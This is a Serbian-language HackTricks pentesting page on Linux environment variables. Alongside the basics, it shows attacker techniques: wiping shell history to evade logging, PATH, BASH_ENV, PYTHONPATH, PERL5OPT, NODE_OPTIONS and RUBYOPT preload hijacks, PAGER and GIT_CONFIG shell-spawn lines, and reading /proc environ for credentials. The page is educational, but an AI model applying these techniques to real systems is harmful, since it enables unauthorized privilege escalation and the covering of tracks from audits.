# Linux promenljive okruženja

{{#include ../../banners/hacktricks-training.md}}

## Globalne promenljive

Globalne promenljive će biti nasleđene od strane **child processes**.

Globalnu promenljivu za trenutnu sesiju možete kreirati na sledeći način:
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
Ova promenljiva će biti dostupna vašim trenutnim sesijama i njihovim podređenim procesima.

Promenljivu možete **ukloniti** pomoću:
```bash
unset MYGLOBAL
```
## Lokalne promenljive

**Lokalnim promenljivama** može pristupiti samo **trenutni shell/skripta**.
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## Izlistaj trenutne promenljive
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
Sadržaj datoteka `/proc/*/environ` je **razdvojen NUL znakovima**, pa su ove varijante obično lakše za čitanje:
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
Ako tražite **credentials** ili **interesantnu konfiguraciju servisa** unutar nasleđenih okruženja, takođe proverite [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md).

## Uobičajene promenljive

Izvor: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)<sup>[[5]](#references)</sup>

- **DISPLAY** – ekran koji koristi **X**. Ova promenljiva je obično postavljena na **:0.0**, što znači prvi ekran na trenutnom računaru.
- **EDITOR** – tekstualni editor koji korisnik preferira.
- **HISTFILESIZE** – maksimalan broj linija sadržanih u history datoteci.
- **HISTSIZE** – broj linija dodatih u history datoteku kada korisnik završi sesiju.
- **HOME** – vaš home direktorijum.
- **HOSTNAME** – hostname računara.
- **LANG** – vaš trenutni jezik.
- **MAIL** – lokacija korisnikovog mail spool-a. Obično **/var/spool/mail/USER**.
- **MANPATH** – lista direktorijuma u kojima treba tražiti manual stranice.
- **OSTYPE** – tip operativnog sistema.
- **PS1** – podrazumevani prompt u bash-u.
- **PATH** – čuva putanju svih direktorijuma koji sadrže binarne fajlove koje želite da izvršite navođenjem samo imena fajla, a ne relativnom ili apsolutnom putanjom.
- **PWD** – trenutni radni direktorijum.
- **SHELL** – putanja do trenutnog command shell-a, na primer **/bin/bash**.
- **TERM** – trenutni tip terminala, na primer **xterm**.
- **TZ** – vaša vremenska zona.
- **USER** – vaše trenutno korisničko ime.

## Zanimljive promenljive za hacking

Nisu sve promenljive podjednako korisne. Iz napadačke perspektive, prioritet imaju promenljive koje menjaju **search paths**, **startup files**, ponašanje **dynamic linker-a** ili **audit/logging**.

### **HISTFILESIZE**

Promenite **vrednost ove promenljive na 0**, tako da se, kada **završite sesiju**, **history datoteka** (\~/.bash_history) **skrati na 0 linija**.
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

Promenite **vrednost ove promenljive na 0** kako se komande **ne bi čuvale u istoriji u memoriji** i kako se ne bi upisivale nazad u **datoteku istorije** (\~/.bash_history).
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

Ako je **vrednost ove promenljive podešena na `ignorespace` ili `ignoreboth`**, nijedna komanda kojoj prethodi dodatni razmak neće biti sačuvana u history.
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

Usmerite **fajl istorije** na **`/dev/null`** ili ga potpuno poništite. Ovo je obično pouzdanije od same promene veličine istorije.
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

Procesi će koristiti ovde deklarisani **proxy** za povezivanje sa internetom putem **http ili https**.
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: podrazumevani proxy za alate/protokole koji ga podržavaju.
- `no_proxy`: lista za zaobilaženje (hostovi/domeni/CIDR-ovi) koji treba da se povežu direktno.
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
Mogu se koristiti i varijante napisane malim i velikim slovima, u zavisnosti od alata (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`).

### SSL_CERT_FILE & SSL_CERT_DIR

Procesi će verovati sertifikatima navedenim u **ovim env promenljivama**. Ovo je korisno za omogućavanje alatima kao što su **`curl`**, **`git`**, Python HTTP klijenti ili package manager-i da veruju CA-u pod kontrolom napadača (na primer, kako bi interception proxy izgledao legitimno).
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

Ako privilegovani wrapper/script izvršava komande **bez apsolutnih putanja**, prva putanja pod kontrolom attackera u `PATH` ima prednost. To je osnova mnogih **PATH hijack** napada u `sudo`, cron poslovima, shell wrapperima i prilagođenim SUID helperima. Potražite `env_keep+=PATH`, slab `secure_path` ili wrappere koji pozivaju `tar`, `service`, `cp`, `python` itd. po nazivu.
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
Za kompletne lance eskalacije privilegija koji zloupotrebljavaju `PATH`, pogledajte [Linux Privilege Escalation](linux-privilege-escalation/README.md).

### **HOME & XDG_CONFIG_HOME**

`HOME` nije samo referenca na direktorijum: mnogi alati automatski učitavaju **dotfiles**, **plugins** i **konfiguraciju po korisniku** iz `$HOME` ili `$XDG_CONFIG_HOME`. Ako privilegovani tok rada zadrži ove vrednosti, **config injection** može biti jednostavniji od **binary hijacking**.
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
Zanimljive mete uključuju `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py` i fajlove specifične za alate, kao što je `.terraformrc`.

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

Ove promenljive utiču na **dynamic linker**:

- `LD_PRELOAD`: prisiljava učitavanje dodatnih shared objekata najpre.
- `LD_LIBRARY_PATH`: dodaje direktorijume za pretragu biblioteka na početak liste.
- `LD_AUDIT`: učitava auditor biblioteke koje nadgledaju učitavanje biblioteka i razrešavanje simbola.

Izuzetno su vredne za **hooking**, **instrumentation** i **privilege escalation** ako ih privilegovana komanda zadrži. U režimu **secure-execution** (`AT_SECURE`, npr. setuid/setgid/capabilities), loader uklanja ili ograničava mnoge od ovih promenljivih. Međutim, parser greške u toj ranoj fazi loadera i dalje imaju veliki uticaj jer se izvršavaju **pre** ciljnog programa.<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` menja rano ponašanje glibc-a (na primer, podešavanja allocator-a) i veoma je koristan u exploit labovima. Takođe je važan iz bezbednosne perspektive zato što ga **dynamic loader parsira veoma rano**. Greška **Looney Tunables** iz 2023. godine bila je dobar podsetnik da jedna promenljiva okruženja parsirana u loader-u može postati **primitive za lokalnu eskalaciju privilegija** protiv SUID programa.<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

Ako se **Bash** pokrene **neinteraktivno**, proverava `BASH_ENV` i izvršava tu datoteku pre pokretanja ciljne skripte. Kada se Bash pozove kao `sh`, ili u interaktivnom režimu u POSIX stilu, može se proveravati i `ENV`. Ovo je klasičan način da se shell wrapper pretvori u izvršavanje koda ako napadač kontroliše okruženje.
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Sam Bash onemogućava ove datoteke za pokretanje kada se **stvarni/efektivni ID-jevi razlikuju**, osim ako se koristi `-p`, pa tačno ponašanje zavisi od toga kako wrapper pokreće shell. Budite oprezni sa privilegovanim wrapperima koji pozivaju `setuid()`/`setgid()` **pre** pokretanja Basha: kada se ID-jevi ponovo podudare, Bash može verovati promenljivama `BASH_ENV`, `ENV` i povezanom stanju shell-a koje bi inače bilo ignorisano.<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

Ove promenljive menjaju način na koji se Python pokreće:

- `PYTHONPATH`: dodaje putanje za pretragu import-a na početak.
- `PYTHONHOME`: premešta stablo standardne biblioteke.
- `PYTHONSTARTUP`: izvršava datoteku pre interaktivnog prompta.
- `PYTHONINSPECT=1`: prelazi u interaktivni režim nakon završetka skripte.

Korisne su protiv skripti za održavanje, debagera, shell-ova i wrappera koji pokreću Python sa okruženjem kojim se može upravljati. `python -E` i `python -I` ignorišu sve `PYTHON*` promenljive.
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
Nedavni primer iz stvarnog sveta bio je 2024. godine **needrestart** LPE na Ubuntu/Debian sistemima: scanner u vlasništvu root-a kopirao je `PYTHONPATH` privilegovanog procesa iz `/proc/<PID>/environ`, a zatim izvršio Python. Objavljeni exploit je postavio `importlib/__init__.so` u putanju pod kontrolom napadača, čime je Python izvršio kod napadača tokom sopstvene inicijalizacije, pre nego što je hard-kodovana skripta helper-a uopšte postala bitna.<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl ima podjednako korisne promenljive pri pokretanju:

- `PERL5LIB`: dodaje direktorijume biblioteka na početak putanje.
- `PERL5OPT`: ubacuje opcije kao da su navedene u svakoj komandnoj liniji `perl`.

Ovo može prinudno aktivirati **automatsko učitavanje modula** ili promeniti ponašanje interpreter-a pre nego što ciljna skripta uradi bilo šta značajno. Perl ignoriše ove promenljive u kontekstima **taint / setuid / setgid**, ali su one i dalje veoma važne za uobičajene wrapper-e koji se pokreću kao root, CI poslove, instalere i prilagođena sudoers pravila.
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` dodaje **Node.js CLI flags** svakom `node` procesu koji nasleđuje okruženje. Zbog toga je koristan protiv wrappera, CI poslova, Electron pomoćnih procesa i sudo pravila koja na kraju pozivaju Node. Najzanimljiviji flagovi za ofanzivne svrhe obično su:

- `--require <file>`: unapred učitava CommonJS fajl pre ciljne skripte.
- `--import <module>`: unapred učitava ES modul pre ciljne skripte.

Node odbacuje neke opasne flagove u okviru `NODE_OPTIONS`, ali su `--require` i `--import` izričito dozvoljeni i obrađuju se **pre** uobičajenih argumenata komandne linije.<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
Za remote gadget chains koje indirektno postavljaju `NODE_OPTIONS` (na primer, prototype-pollution to RCE), pogledajte [ovu drugu stranicu](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md).

### **RUBYLIB & RUBYOPT**

Ruby nudi istu klasu zloupotrebe pri pokretanju:

- `RUBYLIB`: dodaje direktorijume na početak Ruby putanje za učitavanje.
- `RUBYOPT`: ubacuje opcije komandne linije, kao što je `-r`, u svako pokretanje komande `ruby`.
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
Vulnerabilnosti **needrestart** iz 2024. godine pokazale su da ovo nije samo laboratorijski trik: isti helper u vlasništvu korisnika `root`, koji je bio ranjiv na zloupotrebu `PYTHONPATH` promenljive, mogao je biti primoran i da pokrene Ruby sa `RUBYLIB` promenljivom pod kontrolom napadača, učitavajući `enc/encdb.so` iz direktorijuma napadača.<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

Neki alati ne čitaju samo putanju iz environment-a; oni prosleđuju vrednost **shell-u**, **editoru** ili **input preprocesoru**. Zbog toga su sledeće promenljive posebno zanimljive kada privileged wrapper pokreće `git`, `man`, `less` ili slične text viewere:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: biraju pager komandu.
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: biraju editor komandu, često sa argumentima.
- `LESSOPEN`, `LESSCLOSE`: definišu pre/post-procesore koji se pokreću kada `less` otvara fajl.
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git takođe podržava **ubacivanje konfiguracije samo putem environment-a** bez upisivanja na disk pomoću `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>` i `GIT_CONFIG_VALUE_<n>`:
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
Iz perspektive post-exploitation, takođe imajte na umu da nasleđena okruženja često sadrže **credentials**, **proxy settings**, **service tokens** ili **cloud keys**. Pogledajte [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) za `/proc/<PID>/environ` i pronalaženje `systemd` `Environment=` podešavanja.

### PS1

Promenite izgled svog prompta.

[**Ovo je primer**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: Ovo je primer](<../images/image (897).png>)

Regularni korisnik:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri poslata posla u pozadini](<../images/image (740).png>)

Jedan, dva i tri poslata posla u pozadini:

![PERL5OPT & PERL5LIB - PS1: Jedan, dva i tri poslata posla u pozadini](<../images/image (145).png>)

Jedan posao u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena:

![PERL5OPT & PERL5LIB - PS1: Jedan posao u pozadini, jedan zaustavljen, a poslednja komanda nije ispravno završena](<../images/image (715).png>)

## Reference

- [1] [GNU Bash Manual - Datoteke za pokretanje Bash-a](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux manualna stranica](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - LPEs u needrestart](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI dokumentacija - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [Uobičajene environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - Local Privilege Escalation u glibc-ovom ld.so - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)

{{#include ../../banners/hacktricks-training.md}}
